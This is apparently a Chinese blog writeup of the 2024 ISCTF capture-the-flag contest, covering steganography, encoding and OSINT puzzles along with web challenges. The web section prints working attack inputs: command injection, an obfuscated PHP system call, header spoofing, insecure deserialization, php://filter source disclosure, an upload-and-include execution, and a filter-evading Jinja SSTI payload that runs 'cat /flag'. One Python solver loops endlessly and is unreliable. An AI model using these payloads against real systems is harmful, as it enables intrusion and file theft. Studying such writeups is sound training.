---
title: '2024 ISCTF Writeup'
description: '文件末尾有 flag.txt 以及 sfx 字样，分析为 自解压文件'
pubDate: 2024-08-15
author: 'IHK-1'
tags: ['CTF', 'ISCTF', '2024']
---

# MISC
## File_Format
文件末尾有 flag.txt 以及 sfx 字样，分析为 自解压文件

直接改成压缩包爆破拿到密码 241023

## watermark
```plain
key1.txt Text_watermark
key1：FAAqDPjpgKJiB6m

2.PNG WaterMarkH 提取
key2: 64oRvUfta9yJsBv

FAAqDPjpgKJiB6m64oRvUfta9yJsBv
```

解压后在文章中找到

<!-- 这是一张图片，ocr 内容为：ISCTF{WATERMARK_IS_USED_2_P IGITAL*ASSETS}是 2_PROTECT%DI IS_ -->


```plain
ISCTF{Watermark_is_used_2_protect%digital*assets}
```

## 老八奇怪自拍照
r5 g2 b1 三个通道提取出 zip

压缩包内拿到 isctf.jpg

图片作者处拿到 key 1ScTf2024!

steghide 隐写

## 少女的秘密花园
直接分离文件末尾 zip 拿到 base_misc

base_misc.zip 爆破 key 040714

对 base64 解码的图片进行修复宽高

<!-- 这是一张图片，ocr 内容为：JJJ-I 1:CICL -->


盲文解密后拿到 <font style="color:rgb(77, 77, 77);">JFJUGVCGPNBTA3LFL4YG4X3GOIZTK2DNGNXH2</font>

<font style="color:rgb(77, 77, 77);">base32解码 拿到 flag</font>

```plain
ISCTF{C0me_0n_fr35hm3n}
```

## 游园地1
百度识图拿到地址

```plain
ISCTF{湖北省_武汉市_江汉区_中山公园}
```

## 游园地2
[https://blog.l3zc.com/2023/08/wuhan-trip/#%E5%85%85%E8%83%BD%E5%9B%BD%E5%AE%89%E8%B7%AF](https://blog.l3zc.com/2023/08/wuhan-trip/#%E5%85%85%E8%83%BD%E5%9B%BD%E5%AE%89%E8%B7%AF)

```python
ISCTF{湖北省_武汉市_江汉区_鸣笛1988商业街_恋爱绮谭}
```

## starry sky
对 st@rrysky.png 解码后，jpg 文件末尾拿到 XOR: FF

与 xor 文件异或后拿到 wav

对 wav 进行 SSTV 拿到

<!-- 这是一张图片，ocr 内容为： -->


对 DES 进行 解密

<!-- 这是一张图片，ocr 内容为：INPUT RECIPE T4QIQPXAFAKZXDOH6JI+VHH8J1SHJCZ+7YCVWPSEBHCXP5005V0GHA-1 OI FROM BASE64 ALPHABET A-ZA-ZO-9+/ REMOVE NON-ALPHABET CHARS STRICT MODE DES DECRYPT KEY UTF8 YANHUOLG IV HEX 000000000000000 OUTPUT OUTPUT MODE INPUT ISCTF{YOU_@R3_1OOKING_@_ST@RRY_SKY!} CBC RAW RAW -->


```plain
ISCTF{Y0u_@r3_1ooking_@_st@rry_sky!}
```

## 像素圣战
```plain
萧瑟的景象，非常好的ISCTF，使我的工具旋转，爱来自河的南部
```

pixeljhid

b神工具一把梭

## 奇怪的 txt
```python
import base64


def circle_remove_every_seventh(start, end, step):
    circle = list(range(start, end + 1))
    removed = []
    index = 0

    while circle:
        index = (index + step - 1) % len(circle)
        removed_value = circle.pop(index)
        removed.append(removed_value)

    return removed, circle


start = 1
end = 137
step = 7

removed_values, remaining_values = circle_remove_every_seventh(start, end, step)
base64String = ""

for value in removed_values:
    base64String += open(f"奇怪的txt/奇怪的txt/{value}.txt", "r").read()

while True:
    try:
        base64String = base64.b64encode(base64String.encode()).decode()
    except:
        print()
```

## 秘密
伪加密 oursecret key ISCTF2024

0宽隐写

```plain
ISCTF{Nic3_t0_m33t_you}
```

## 赢!rar ×
## 神秘ping
ICMP TTL 隐写

## 数字迷雾：在像素中寻找线索
LSB

```plain
ISCTF{+9qn1DKdun!glAK|
ISCTF{+9qn1DKdun!glAK}
```

## 神秘wav
## 来自天外的信息
曼彻斯特编码

# web
## 1z_php
```plain
J=cp /f14g /var/www/html/flag
```

直接将文件复制到网站目录下

## 25时晓山瑞希生日会
```plain
X-Forwarded-For:127.0.0.1
Date: Sun, 27 Aug 2024 05:00:00 GMT
```

## ez_rce
```plain
('sy'.'stem')('c'.'at${IFS}/fla'.'g');
```

## 小蓝鲨的冒险
```plain
b=a[0]=s878926199a&which=flag
num=03750
```

## ezserialize
```php
<?php
class User
{
    public $isAdmin = false;
}

$a = new User();
$a -> isAdmin = true;
echo serialize($a);
```

## 小蓝鲨的秘密
略

## UP!UPloader
上传后对 include.php ，伪协议 拿到源码

```plain
php://filter/convert.base64-encode/resource=upload.php
```

```php
<?php
  error_reporting(0);
$file = $_FILES['file'];
if (isset($file) && $file['size'] > 0) {
  $ext = pathinfo($file['name'], PATHINFO_EXTENSION);
  $name = pathinfo($file['name'], PATHINFO_FILENAME);
  $dir_name = $name . '.' . $ext;
  $upload_dir = './uploads/';
  if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0755, true);
  }
  if (move_uploaded_file($file['tmp_name'], $upload_dir . md5($dir_name) . '.' . $ext)) {
    echo "文件上传成功！不过文件路径可不好找呀~什么？什么include.php？我不知道啊。" ;
  } else {
    echo "文件存储失败，未知原因......";
  }
  die();
}
  ?>
```

使用重渲染的图片上传

```plain
filename=/var/www/html/uploads/4a47a0db6e60853dedfcfdf08a5ca249.png&0=system
1=env
```

## ezSSTI
```plain
user_input=
{% set xiahuaxian=(lipsum|string|list).pop(18)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %}
{% set os=dict(os=a)|join %}
{% set command="cat /flag" %}
{% set popen=dict(popen=a)|join %}
{% set read=dict(read=a)|join %}
{{ lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(command)|attr(read)() }}
```

## 小蓝鲨的临时存储室
上传文件后，使用 /down_file.sh 的计划任务进行提权

## 小蓝鲨的故事
flask 通过 robots 的 key 伪造

